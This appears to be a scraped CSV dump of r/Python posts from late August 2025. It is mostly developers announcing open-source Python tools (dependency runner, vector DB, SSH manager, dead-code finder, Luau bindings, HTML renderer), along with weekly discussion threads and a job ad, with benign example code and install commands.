- The package name in your `import` doesn‚Äôt match the one on PyPI (`sklearn` vs `scikit-learn`, anyone?)  

I ran into this problem constantly, so I created **SmartRun** üéâ
**Link:**  
üëâ GitHub: [https://github.com/SermetPekin/smartrun](https://github.com/SermetPekin/smartrun)  
üëâ PyPI: [https://pypi.org/project/smartrun/](https://pypi.org/project/smartrun/)  

### What my project does
üëâ What it does:  
- Scans your Python file (or Jupyter notebook) for imports  
- Automatically installs missing packages (fixing naming issues along the way)  
- Creates/uses a virtual environment if you want  
- Lets you specify package versions inline with a simple comment (Optional)  
- Then runs your file with everything ready to go  

No more hunting down `pip install` errors or trying to remember which package corresponds to which import. Just:  


```bash
smartrun myscript.py
```
‚Ä¶and it works. üöÄ
```python
# smartrun: pandas>=2.0 seaborn>=0.11 matplotlib>=3.5

import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt

# Load dataset from GitHub
url = ""https://raw.githubusercontent.com/datasciencedojo/datasets/master/titanic.csv""
df = pd.read_csv(url)

# Basic stats
print(df[[""Survived"", ""Pclass"", ""Sex""]].groupby([""Pclass"", ""Sex""]).mean())

# Plot survival by class
sns.countplot(data=df, x=""Pclass"", hue=""Survived"")
plt.title(""Survival Count by Passenger Class"")
output_path = ""titanic_survival_by_class.png""
plt.savefig(output_path)

print(f""‚úÖ Saved plot ‚Üí {output_path}"")
```

### Target audience

- Python developers who frequently switch between projects or environments
- Data scientists working with Jupyter notebooks who hate pip install interruptions
- Students/new learners who just want code examples to ‚Äújust run‚Äù without setup frustration
- Anyone who‚Äôs tired of the ‚ÄúImportError ‚Üí pip install ‚Üí try again‚Äù cycle

Would love feedback from the community ‚Äì especially if you‚Äôve had similar headaches or ideas for making this even smarter.

https://github.com/SermetPekin/smartrun
https://pypi.org/project/smartrun/
"
1mxwbn4,AI Database : OctaneDB,shahbazahmadkhan,0,7,2025-08-23 08:50:45,https://www.reddit.com/r/Python/comments/1mxwbn4/ai_database_octanedb/,"Hey folks üëã

I‚Äôm excited to share OctaneDB, a new lightweight Python vector database.

‚ö° Why OctaneDB?

10x faster performance compared to Pinecone, ChromaDB, and Qdrant (benchmark results coming soon).

Lightweight & pure Python ‚Äì no heavy dependencies, quick to set up.

Optimized algorithms under the hood for blazing-fast similarity search.

AI/ML focused ‚Äì ideal for applications that need real-time vector search and embeddings.


üîç Use Cases

Semantic search

RAG (Retrieval-Augmented Generation)

Recommendation systems

AI assistants & chatbots


üõ†Ô∏è Tech Highlights

Modern Python implementation

In-memory + persistence support

Scales with your ML workflow
"
1mxvre9,Looking for ppl to Collaborate with!!!,Own-Perception-4693,0,3,2025-08-23 08:14:52,https://www.reddit.com/r/Python/comments/1mxvre9/looking_for_ppl_to_collaborate_with/,"Hey everyone,

I‚Äôve recently graduated from college and I‚Äôm currently working as a Software Engineer in Pune, India. I‚Äôm looking to connect with people who‚Äôd like to collaborate on projects ‚Äî both to grow my knowledge and for networking.

If you have any project ideas we could build together, or even if you just want to brainstorm and see where it leads, feel free to DM me!

A little about me:

* Fluent in **Python** üêç
* Experience with frameworks like **Django**, **FastAPI**, and some **Streamlit**
* Recently started exploring **Django Ninja** for a more Pydantic-style experience

Always excited to learn and work on fun projects with like-minded people."
1mxtbt1,A Simple TUI SSH Manager,WMRamadan81,12,16,2025-08-23 05:45:31,https://www.reddit.com/r/Python/comments/1mxtbt1/a_simple_tui_ssh_manager/,"# What My Project Does:

This is a TUI (Terminal User Interface) python app that shows a list of hosts configured from a yaml file and when that host is selected will ssh directly into that host. The goal is SSH Management for those who manage a large number of hosts that you SSH into on a regular basis.

# Target Audience:

* System Administrator's
* DevOps
* ITOps

# Comparison:

I have been searching for a simple to use SSH Manager that runs in the terminal yet I cam across some that don't work or function the way I wanted, and others that are only web-based or use a paid Desktop GUI. So I decided to write my own in python. I wonder if this is beneficial to anyone so maybe I can expand on it?

**Tested & Compatible OS's:**  Windows 11, macOS, Linux, FreeBSD and OpenBSD

**GitHub Source Code:** [https://github.com/WMRamadan/sshup-tui](https://github.com/WMRamadan/sshup-tui)

**PyPi Library:** [https://pypi.org/project/sshup/](https://pypi.org/project/sshup/)"
1mxsiqi,Dark mode coming to my browser!,Apart-Television4396,0,1,2025-08-23 04:59:07,https://www.reddit.com/r/Python/comments/1mxsiqi/dark_mode_coming_to_my_browser/,"Hello, everyone! I wanted to announce that a brand new Dark Mode theme is coming to my browser! I've been working hard on it, and I'm excited to announce that it's now available in my latest public test build (v1.5.0)! This is the first step toward a more comfortable and modern look for the browser. If you have anything you would like me to improve in terms of Dark Mode, feel free to write it here. You can start testing by downloading the newest version in the comments. If you have a GitHub account, you can open an issue, too!"
1mxp7cs,Skylos - another dead code finder for python (updated!),papersashimi,8,0,2025-08-23 02:03:47,https://www.reddit.com/r/Python/comments/1mxp7cs/skylos_another_dead_code_finder_for_python_updated/,"Hihi, 

Been a while! Have been working and testing skylos to improve it. So here are some changes that i've made over the last month!

**Highlights**

* Improved understanding for common web frameworks (e.g., django/fastapi/flask) and pydantic patterns, so reduced FPs.
* Test-aware: recognizes test files etc. 
* **Improved interactive CLI** to select removals, and safe codemods (LibCST) for unused imports/functions.
* Optional **web UI** at [`http://localhost:5090`](http://localhost:5090) 
* Added a pre-commit hook

**Quickstart**

    pip install skylos
    
    # JSON report
    skylos --json /path/to/repo
    
    # interactive cleanup
    skylos --interactive /path/to/repo
    
    # web ui
    skylos run
    

**CI / pre-commit**

* Pre-commit: see README for  hook

**Target Audience**

Anyone or everyone who likes to clean up their dead code

**Repo**: [https://github.com/duriantaco/skylos](https://github.com/duriantaco/skylos)

  
If you like this repo and found it useful, please star it :) If you'll like to contribute or want some features please drop me a message too. my email can be found in github or you can just message me here. "
1mxmm6l,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,6,0,2025-08-23 00:00:21,https://www.reddit.com/r/Python/comments/1mxmm6l/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1mxjbt7,Pypistats.org is back online!,guyfromwhitechicks,19,11,2025-08-22 21:41:07,https://www.reddit.com/r/Python/comments/1mxjbt7/pypistatsorg_is_back_online/,"Following up on my last post: https://www.reddit.com/r/Python/comments/1mnaren/so_what_happened_to_pypistats/

And after devs organized themselves in the github issue: https://github.com/psf/pypistats.org/issues/82#issuecomment-3214903211

~~https://www.pypistats.org/~~ https://pypistats.org/ is now back online!"
1mxj62r,Glyph.Flow: a minimalist project and task manager,Ok-Republic-120,35,2,2025-08-22 21:34:44,https://www.reddit.com/r/Python/comments/1mxj62r/glyphflow_a_minimalist_project_and_task_manager/,"**Hey everyone,**

I‚Äôve been working on a project called **Glyph.Flow**, a minimalist workflow manager written in **Python** with [Textual](https://github.com/Textualize/textual) (and Rich).  
It‚Äôs basically a text-based project/phase/task/subtask manager that runs in the terminal.

[GitHub](https://github.com/daemonic01/Glyph.Flow)

**What My Project Does**  
Glyph.Flow is a **text-based workflow manager** written in Python with [Textual](https://github.com/Textualize/textual).  
It manages projects hierarchically (Project ‚Üí Phase ‚Üí Task ‚Üí Subtask) and tracks progress as subtasks are marked complete.  
Commands are typed like in a little shell, and now defined declaratively through a central **command registry**.  
The plan is to build a full **TUI interface** on top of this backend once the CLI core is stable.

**Target Audience**  
Right now it‚Äôs a **prototype / devlog project**.  
It‚Äôs not production-ready, but intended for:

* developers who like working inside the terminal,
* folks curious about **Textual/Rich** as a platform for building non-trivial apps,
* anyone who wants a lightweight project/task manager without web/app overhead.

**Comparison**  
Most workflow managers are web-based or GUI-driven.

* Compared to **taskwarrior** or **todo.txt**: Glyph.Flow emphasizes **hierarchical structures** (phases, tasks, subtasks) rather than flat task lists.
* Compared to existing **Python CLI tools**: it‚Äôs built on Textual, aiming to evolve into a TUI with styled logs, tables, and panels, closer to a ‚Äúconsole app‚Äù experience than a plain script.
* It‚Äôs still early days, but the design focuses on modularity: adding a new command = one dict entry + a handler, instead of editing core code.

**This week‚Äôs milestone:**

* Refactored from a giant [`app.py`](http://app.py) into a clean modular backend.
* Added schema-based parsing, unified logging/autosave/error handling.
* New `config` command to tweak settings.

I‚Äôd love feedback from anyone, especially who‚Äôs used Textual/Rich for larger projects. üöÄ"
1mxepz6,Looking for Python/Excel App Testers,Technical-Quail4296,3,17,2025-08-22 18:41:01,https://www.reddit.com/r/Python/comments/1mxepz6/looking_for_pythonexcel_app_testers/,"Hi all, I'm currently developing an open-source Excel Add-In which brings arbitrary, local Python support to Excel Workbooks in one click.

[xlpro.pages.dev](http://xlpro.pages.dev)

As a Python enthusiast, I've always felt like Excel is quite limiting. On the other hand, I'll admit it is a nightmare to distribute a Python script to non-technical users in most business settings.

The goal here is to be able to distribute Python functionality easily under the business-friendly guise of Excel, while avoiding unnecessary cloud connections and being familiar to Python developers.

Core Features:

* Define arbitrary Python functions, use them from the formula bar.
* Dynamic Python charts in Excel which respond to your spreadsheet.
* Macro Support, e.g. replace VBA with Python.
* Native VSCode and Debugging support.
* Runs locally, no cloud or telemetry.

This has been a passion project of mine over several months, and it has reached the point where I am looking for early testers ahead of a public release.

If you are interested, and ideally have some experience in VSCode Excel (and an O365 Excel license), please leave a comment or DM and I can share further details.

Appreciate any support. Thanks!

Edit: Link added"
1mxc3i0,[Hiring][Remote] Mercor is hiring ML professionals ($75-$125 per hour),Creative-Minute4389,0,0,2025-08-22 17:02:15,https://www.reddit.com/r/Python/comments/1mxc3i0/hiringremote_mercor_is_hiring_ml_professionals/,"Hello, I wanted to share this offer with you, which might interest ML experts.

Mercor is hiring Machine Learning professionals (Remote | $75‚Äì$125/hr + bonuses).

**Responsibilities:**

* Evaluate and improve ML outputs & pipelines
* Work on model design, training, and optimization
* Collaborate with top researchers & engineers

**Perks:**

* $75‚Äì$125/hr + weekly bonuses ($20‚Äì$100/hr)
* Part-time (\~20h/week), flexible schedule, fully remote
* Paid trial task, daily payments via Stripe

**Requirements:**

* 2+ years ML / data science experience (deep learning preferred)
* Strong ML frameworks skills
* Solid knowledge of pipelines & large-scale systems

Please feel free to apply through this¬†[link.](https://work.mercor.com/jobs/list_AAABmMuDqXcU9o82SY5AzYLO?referralCode=e3851585-1ac7-47d1-9f0e-82c8e3eb4d54&utm_source=referral&utm_medium=share&utm_campaign=job_referral)"
1mxbp9i,complexipy v4.0: cognitive complexity analysis for Python,fexx3l,57,12,2025-08-22 16:47:18,https://www.reddit.com/r/Python/comments/1mxbp9i/complexipy_v40_cognitive_complexity_analysis_for/,"Hey everyone,  
I'm excited to announce the release of **complexipy v4.0.0**!  
This version brings important improvements to configuration, performance, and documentation, along with a breaking change in complexity calculation that makes results more accurate.

**What my project does**

`complexipy` is a high-performance command-line tool and library that calculates the cognitive complexity of Python code. Unlike cyclomatic complexity, which measures how complex code is to test, cognitive complexity measures how difficult code is for humans to read and understand.

**Target Audience**

`complexipy` is built for:

- Python developers who care about readable, maintainable code.
- Teams who want to enforce quality standards in CI/CD pipelines.
- Open-source maintainers looking for automated complexity checks.
- Developers who want real-time feedback in their editors or pre-commit hooks.

Whether you're working solo or in a team, `complexipy` helps you keep complexity under control.

**Comparison to Alternatives**

To my knowledge, complexipy is still the only dedicated tool focusing specifically on cognitive complexity analysis for Python with strong performance and integrations.
It complements other linters and code quality tools by focusing on a metric that directly impacts code readability and maintainability.

**Highlights of v4.0**

- **Configurable via pyproject.toml**: You can now define default arguments in `[tool.complexipy]` inside `pyproject.toml` or use a standalone `complexipy.toml`. This improves workflow consistency and developer experience.
- **Breaking change in complexity calculation**: The way boolean operators are counted in conditions has been updated to align with the original paper‚Äôs definition. This may result in higher reported complexities, but ensures more accurate measurements.
- **Better documentation**: The docs have been updated and reorganized to make getting started and configuring complexipy easier.

**Links**

GitHub Repo: https://github.com/rohaquinlop/complexipy
v4.0.0 Release Notes: https://github.com/rohaquinlop/complexipy/releases/tag/4.0.0"
1mxaxzv,Complete Python Learning Guide,santosh-vandari,14,1,2025-08-22 16:18:56,https://www.reddit.com/r/Python/comments/1mxaxzv/complete_python_learning_guide/,"Hey everyone! üëã

I‚Äôve created a [Python Developer Roadmap](https://github.com/santoshvandari/Python-Developer-Roadmap) designed to guide beginners to mid-level learners through a structured path in Python.

If you‚Äôre interested, feel free to explore it, suggest improvements, or contribute via PRs!

Check it out here: [Python Developer Roadmap](https://github.com/santoshvandari/Python-Developer-Roadmap)"
1mx9w5r,Graphical Petri-Net Inspired Agent Oriented Programming Language Based on Python,Pytrithon,3,6,2025-08-22 15:39:12,https://www.reddit.com/r/Python/comments/1mx9w5r/graphical_petrinet_inspired_agent_oriented/,"Hello everyone!

Pytrithon is a graphical petri-net inspired agent oriented programming language based on Python.

It is a fully fledged universal programming language that can be used to program arbitrary applications.

The target audience is every Python programmer that wants to try something new, from beginner to expert.

It is a totally new thing and can not be compared to anything else.



I started developing it during my bachelor's thesis in 2009, which culminated in my master's thesis at the university in 2015.

Ergo the language has a history of around 16 years, during which I continuously refined it.

In the past couple years I created a second prototype which I am now sharing, the creation of which led to further insights into how the language should be structured in detail.

I consider my new prototype to be very well done considering that I alone worked on it in my free time.

It is like Python on steroids and in my opinion the best new thing since sliced bread.



Instead of a tree structure of linear code files, in Pytrithon you have one two dimensional grid of interconnected Elements similar to a petri-net modeling the control flow for each Agent.

There are Places of several different kinds which are represented as circles which model the global or intermediate data and determine pre- and postconditions for control flow.

There are Transitions of several different kinds for Python code and for modeling control flow which are represented as rectangles.

There are Gadgets for embedding GUI widgets into an Agent which are represented by rounded squares.

Finally, these Elements are interconnected through Arcs with Aliases which define which Transitions access which Places.

It integrates agent communication into the core language and simplifies architecture concerns to agent orientation.

There are specialized Transitions which directly model control flow and are the equivalents of: an if statement, a match statement, a list comprehension, a signal, a method, a timer, and more.

These are mainly used to model rough control flow; a lot can already be done with simple Python Transitions using suppression.

Integral to distributing the code into many individual Agents which cooperate, there are Transitions which model inter Agent communication.

Agents can send out arbitrary Python objects to all listening other Agents, or trigger a Task, which encapsulates a whole interaction.

As the core data format for the Agents, I have devised a Python-esque textual language, which fully supports the needs of git for versioning, and is directly modifiable.



There are three types of processes: the Nexus, which is the communication core, the Monipulator, which allows developing Agents graphically and inpecting them while they are running, and the Agents, which run as their own Python processes and encapsulate the net code.

In theory the prototype should support Nexus nodes distributed to several computers, which allows communication across system boundaries.



In order to prove that Pytrithon is suitable for any task I programmed a whole game in it: TMWOTY2, which runs as six different Agents communicating with eachother through the Nexus and achieving a solid 60 frames per second.



As I am a single person the prototype still is very limited, but well, it's only a proof of concept.

Pytrithon, in my opinion, has extreme potential and I can already imagine tons of ideas which would be feasible as a professional product, like a repository of cryptically signed Agent code, support for arbitrary coarsening and expanding of parts of a net, and precompilation of individual Transitions.

I would love for you to check it out from GitHub and experiment with it.



It took a lot of courage from me to finally release Pytrithon into the world after it spent years as a personal pet project possibly forever.

The code does not really follow contemporary coding practices since it is only a prototype and originated before I learned of those.



I would welcome feedback on what problems you had exploring it, or what features you think should be added next.

Tips on cooperating as a business or fundraising are welcome.

My dream is that I can work full time on it and earn a living from it.



GitHub: [https://github.com/JochenSimon/pytrithon](https://github.com/JochenSimon/pytrithon) 

"
1mx7zzj,"rovr: a modern, customizable, and aesthetically pleasing terminal file explorer.",NotSoProGamerR,24,10,2025-08-22 14:26:55,https://www.reddit.com/r/Python/comments/1mx7zzj/rovr_a_modern_customizable_and_aesthetically/,"source code: https://github.com/nspc911/rovr

what my project does:
- its a file manager in the terminal, made with the textual framework

comparision:
- rovr based on my testing can only compete with superfile.
- as a python project, it cannot compete in performance with yazi at all, nor can it compete with an ncurses focused ranger.
- the main point of rovr was to make it a nice experience in the terminal, and to also have touch support, something that lacked, or just felt weird, when using them

hey guys! just wanted to introduce yall to my latest project, rovr!
rovr is something that stemmed from an issue i faced in superfile which was that threaded rendering wasn't supported yet. back then, i also just discovered textual and really wanted to push its limits.
so after 3 months, and 4 minor releases, here we are! there are quite some issues that i found, hence why i havent given it the major bump, i dont feel safe doing so unlike my other projects.
the documentation is available at https://nspc911.github.io/rovr, I had quite the fun messing around with astro, my first actual web framework.
rovr is extremely customisable. I'm hoping for plugin support soon, but id like to fix as much bugs as possible, before chasing the skies. rovr also supports insane theme customizability thanks to textual's tcss system, which allows for the weirdest styles to exist because, well, it can be done
if you are interested, please drop a star! maybe even contribute a theme or two, because textual's default themes are not enough at all to cover everyone's preferences.
however, be warned that as much as I managed to optimise, I still cannot mount widgets outside of the app's main loop, so doing heavy mounting processes cause an insane lag. as stated in the docs already, rovr is not for those who have an existing workflow around other file managers, especially yazi
(to those looking at the code, no, not everything was written by ai. i managed to learn debouncing from it, before improving the debouncing mechanism, but the zip handling was entirely thanks to it, i couldnt have handled zip files as a whole without it)"
1mx5xfp,Automatically document SQLAlchemy Databases with Diagrams created with Paracelsus,tedivm,69,6,2025-08-22 13:02:52,https://www.reddit.com/r/Python/comments/1mx5xfp/automatically_document_sqlalchemy_databases_with/,"## What My Project Does

The [Paracelsus](https://github.com/tedivm/paracelsus) library automatically generates Entity Relationship Diagrams for SQLAlchemy databases, making it easy to keep documentation up to date with the latest changes in your database. 

Diagrams can be created in Mermaid, allowing for easy embedding into Markdown files, or as Dot Diagrams to convert into PNG files. It was also designed to be easy to inject diagrams into existing documentation and keep them up to date, similar to tools like terraform-docs.

target audience: anyone"
1mx53x9,Examples of using UV,jjrreett,75,52,2025-08-22 12:26:50,https://www.reddit.com/r/Python/comments/1mx53x9/examples_of_using_uv/,"I work at a hardware engineering company. I am going to give a talk demoing UV. I am also going to talk about why you should format your project as a package. Any good repos of showcasing the pip workflow vs uv. Any good tutorials or talks i can borrow from. 

Update: with regard to setting up repos as packaging, i showed some examples of people doing some hacky shit with sys.path and copying and pasting code. I showed how it could be better.

with regard to uv, i showed a speed test of uv vs pyenv and venv by installing ‚Äúnotebook‚Äù. I showed how uv can run code from one of my repos. Then i showcased uv venv for repos without a pyproject. then demoed uv tool and uv init. 

Id say the talk went reasonably well. I don‚Äôt expect a sea change, but hopefully people have a better understanding of what is possible and have some search terms the can use next time they are coding. 

Now if only i can get them using wsl"
1mx3tlj,pluau: Python bindings for Luau using PyO3/maturin.,Lower_Calligrapher_6,5,4,2025-08-22 11:24:16,https://www.reddit.com/r/Python/comments/1mx3tlj/pluau_python_bindings_for_luau_using_pyo3maturin/,"**Source code link**: https://github.com/gluau/pluau (PyPI package coming soon!)

After working on gluau (which provides high level Go bindings for Luau), I've decided to also make pluau which provides high level python bindings for Luau using PyO3/Maturin (and mluau, my fork of mlua with several patches needed for pluau to actually work). Unlike Lupa and other Lua binding projects, pluau is focused on only Luau support.

# What My Project Does

Pluau provides high level python bindings for Luau using PyO3/Maturin.
    
# Target Audience

Pluau is targetted towards Python developers who want to embed Luau into their applications for whatever reason. Note that pluau is still in WIP but is based on mluau which is production ready itself (so pluau shouldnt be unstable or anything like that)
    
# Comparison

Unlike alternatives like Lupa, pluau supports Luau and is in fact targetted specifically for Luau (with support for Luau-specific extensions like sandboxing and safeenv). Any contribution to pluau that involves adding non-Luau support will be rejected. Additionally, plusu aims to be sandboxed against malicious scripts.

## Sample Usage / Examples

### Creating a Lua VM and running a script

```py
import pluau
lua = pluau.Lua()
lua.set_memory_limit(1 * 1024 * 1024) # Optional: Set memory limit of the created Lua VM to 1MB
func = lua.load_chunk(""return 2 + 2"", name=""example"") # You can optionally set env as well to give the chunk its own custom global environment table (_G)
result = func()
print(result)  # [4]
```

### Tables

Note that tables in pluau are not indexable via `a[b]` syntax. This is because tables have two ways of getting/setting with subtle differences. get/set get/set while invoking metamethods like index and newindex. Meanwhile, rawget/rawset do the same thing as get/set however does not invoke metamethods. As such, there is a need to be explicit on which get and set operation you want as they are subtly different.

```py
tab = lua.create_table()
tab.push(123)
tab.set(""key1"", 456)

# Prints 1 123 followed by key1 456
for k, v in tab: 
    print(""key"", k, v)
print(len(tab)) # 1 (Lua/Luau only considers array part for length operator)

# Set a metatable
my_metatable = lua.create_table()
tab.set_metatable(my_metatable)

# Set the readonly property on the table (Luau-specific security feature) Luau s
tab.readonly = True

# The below will error now since the table is readonly
tab.set(""key2"", 789) # errors with ""runtime error: attempt to modify a readonly table""
tab.readonly = False # make it writable again
tab.set(""key2"", 789) # works now
```

### Setting execution time limits

Luau offers interrupts which is a callback function that is called periodically during execution of Luau code. This can be used to implement execution time limits.

```py
import pluau
import time
start_time = time.time()
def interrupt(_: pluau.Lua):
    if time.time() - start_time > 1.0: # 1 second limit
        return pluau.VmState.Yield
    return pluau.VmState.Continue

lua = pluau.Lua()
lua.set_interrupt(interrupt)
func = lua.load_chunk(""while true do end"", name=""infinite_loop"")

# When using interrupts, the function should be made into a thread and then resumed. Otherwise, the yield will lead to a runtime error.
thread = lua.create_thread(func)
result = thread.resume() # Resume the thread with no arguments
print(result, thread.status) # Prints [] ThreadState.Resumable after 1 second
```

### Wrapper Utility

By default, pluau only allows mapping primitive python objects to Luau and back. To improve this, pluau.utils provide Wrapper and Object utility classes to wrap arbitrary python objects into primitives (if possible) or a opaque userdata if not. Whether or not a opaque userdata has its fields proxied as well is controlled by ``secure_userdata`` flag which defaults to True (no field proxying).

```py
wrapper = Wrapper(lua, secure_userdata=False)
class TestObject:
    def __init__(self):
        self.foo = 123
        self.blah = 393

code = lua.load_chunk(""local obj = ...; print(obj, obj.foo, obj.blah, obj.bar); assert(obj.foo == 123); assert(obj.blah == 393)"")
code(wrapper.wrap(TestObject()))

code = lua.load_chunk(""local obj = ...; print(obj, obj.foo, obj.blah, obj.bar); assert(obj.foo == 123); assert(obj.blah == 393)"")
code(wrapper.wrap({""foo"": 123, ""blah"": 393}))

# output:
#
# TestObject: 0x00006478de56f070  123     393     nil
# table: 0x00006478de56ef70       123     393     nil
```"
1mx2aqc,I built a car price prediction app with Python + C#,Hot-Act-6660,31,12,2025-08-22 09:59:10,https://www.reddit.com/r/Python/comments/1mx2aqc/i_built_a_car_price_prediction_app_with_python_c/,"Hey,  
I made a pet project called **AutoPredict** ‚Äì it scrapes real listings from an Italian car marketplace (270k+ cars), cleans the data with Pandas, trains a CatBoost model, and then predicts the market value of any car based on its specs.

The Python backend handles data + ML, while the C# WinForms frontend provides a simple UI. They talk via STDIN/STDOUT.  
Would love to hear feedback on the approach and what could be improved!

Repo: [https://github.com/Uladislau-Kulikou/AutoPredict](https://github.com/Uladislau-Kulikou/AutoPredict) 

(The auto-moderator is a pain in the ass, so I have to say - target audience: anyone)[](https://github.com/Uladislau-Kulikou/AutoPredict)"
1mww3tj,[Release] Syda ‚Äì Open Source Synthetic Data Generator with Referential Integrity,TerribleToe1251,7,8,2025-08-22 03:43:04,https://www.reddit.com/r/Python/comments/1mww3tj/release_syda_open_source_synthetic_data_generator/,"I built **Syda**, a Python library for generating multi-table synthetic data with **guaranteed referential integrity** between tables.

Highlights:

* Works with multiple AI providers (OpenAI, Anthropic)
* Supports SQLAlchemy, YAML, JSON, and dict schemas
* Enables custom generators and AI-powered document output (PDFs)
* Ships via PyPI, fully open source

**GitHub:** [github.com/syda-ai/syda](http://github.com/syda-ai/syda)

**Docs:** [python.syda.ai](http://python.syda.ai)

**PyPI:** [pypi.org/project/syda/](http://pypi.org/project/syda/)

Would love your feedback on how this could fit into your Python workflows!"
1mwt6ts,What concepts would you like interactive lessons on for yourself or your fellow learners?,Kitchen_Beginning513,0,4,2025-08-22 01:21:42,https://www.reddit.com/r/Python/comments/1mwt6ts/what_concepts_would_you_like_interactive_lessons/,"Hey guys, I'm working in Jupyter notebooks and trying to make interactive lessons on a range of topics.  I've tackled some PyGame development, and I love using ipywidgets to make interactive function builders for people to quickly explore new possibilities.  

I like embedding videos and such for it to be right there for the learners.  

What types of concepts would be useful to learn interactively, and how would you make interactive lessons if not in jupyter?  "
1mwrf8z,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,2,0,2025-08-22 00:00:45,https://www.reddit.com/r/Python/comments/1mwrf8z/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1mwp2kw,"Re-vision, getting more out of YOLO (or any box detection)",Specialist_Ruin_9333,17,8,2025-08-21 22:18:51,https://www.reddit.com/r/Python/comments/1mwp2kw/revision_getting_more_out_of_yolo_or_any_box/,"Hi everyone,

I wrote this hacky tool after getting annoyed by YOLO missing stuff in my documents.

What my project does:

It detects bboxes with content in documents, using YOLO, it uses multiple YOLO runs.

To solve the problem I faced, you keep the threshold high so anything detected is what the model thinks it is, in every YOLO iteration, it masks out the bboxes found from the image and uses the masked image as input in the next iteration, effectively making the input image simpler for YOLO each iteration while ensuring the boxes are reliable. I've found 2 iterations enough for my use case. This technique will work for all bbox detection models albeit at the cost of more computation, which in YOLO's case wasn't a deal-breaker.

This may not be an original idea, wanted to share it anyway.

Here's the implementation: https://github.com/n1teshy/re-vision

A great application I can think of is, getting the bboxes with multiple runs, on your data and then fine-tuning YOLO on this dataset so you only have to run it once.

Any ideas/critique would be appreciated."
1mwmo0i,How lucrative are python bots,Sufficient-Carpet391,0,6,2025-08-21 20:43:32,https://www.reddit.com/r/Python/comments/1mwmo0i/how_lucrative_are_python_bots/,"Anyone have any experience botting? I have some python experience and have become interested in bots, whether they automate simple tasks or trade stocks using complex algorithms, they just interest me. Curious if anyone else has experience in this field."
1mwjrde,"Change my mind: compared to other languages, Python sucks.",Reasonable_Run_5529,0,108,2025-08-21 18:53:23,https://www.reddit.com/r/Python/comments/1mwjrde/change_my_mind_compared_to_other_languages_python/,"Whether you are trying to install a library or package, import a module, deal with a virtual environment, cope with the lack (or purpose) of strong typing, search documentation, or debug, Python's developer experience is infuriating. 

To me, it looks like a failed attempt at creating a minimalist programming language. The result is an anarchic mess, that makes you waste more time on administrative tasks and setup than reasoning and coding. 

  
All other languages I can think of are way more mature. Perform better. Let you write more meaningful code. Allow to architect your software in a cleaner way. Provides tools to handle errors and even prevent them, with basic typing. 

  
There. Come at me :D But this stuff makes you want to quit.

"
1mwc0to,simple-html 3.0.0 - improved ergonomics and 2x speedup,nebbly,15,27,2025-08-21 14:10:57,https://www.reddit.com/r/Python/comments/1mwc0to/simplehtml_300_improved_ergonomics_and_2x_speedup/,"## What My Project Does
Renders HTML in pure Python (no templates)

## Target Audience
Production

## Comparison
There are similar template-less renderers like dominate, fast-html, PyHTML, htmy. In comparison to those simple-html tends to be:

- more concise
- faster ‚Äî it's even faster than Jinja (AFAICT it‚Äôs currently the fastest library for rendering HTML in Python)
- more fully-typed

## Changes
- About 2x faster (thanks largely to mypyc compilation)
- An attributes dictionary is now optional for tags, reducing clutter. 

        from simple_html import h1
        
        h1(""hello"") # before: h1({}, ""hello"")

- `int`s, `float`s, and `Decimal` are now accepted as leaf nodes, so you can do 


        from simple_html import p
        
        p(123) # before: p(str(123))


## Try it out
Copy the following code to example.py:

    from flask import Flask
    from simple_html import render, h1
    
    app = Flask(__name__)

    @app.route(""/"")
    def hello_world():
        return render(h1(""Hello World!""))
 
Then run 

`pip install flask simple_html`

`flask --app example run`

Finally, visit http://127.0.0.1:5000 in the browser


Looking forward to your feedback. Thanks!

[https://github.com/keithasaurus/simple_html](https://github.com/keithasaurus/simple_html)"
1mw776v,"Monkesearch: open source, offline natural language query for local files, with temporal awareness",fuckAIbruhIhateCorps,8,2,2025-08-21 10:30:31,https://www.reddit.com/r/Python/comments/1mw776v/monkesearch_open_source_offline_natural_language/,"Today I am very excited to release a very bare bones and working prototype for this!  
[https://github.com/monkesearch/monkeSearch](https://github.com/monkesearch/monkeSearch)

I'd love to get reviews and suggestions for this, and I've used macOS's inbuilt spotlight indexing for the query. There are a lot of modifications and feature additions to be done now but I want you guys to try it out locally. Current file search is only limited to a few file types because I am associating the macOS specific uniform type identifiers with file types, and that has been done manually just for the prototype right now. Also this is just the prototype / proof of concept and we need more refinement!

**What My Project Does**:

You can search for your local files using natural english language.

No data leaves your pc and it is aimed at being able to run on potato pcs. And I'm currently aiming at a smaller and smarter model (Gemma 3 270M finetune) to increase the accuracy of the tool (even though it's pretty accurate right away with base Qwen3)

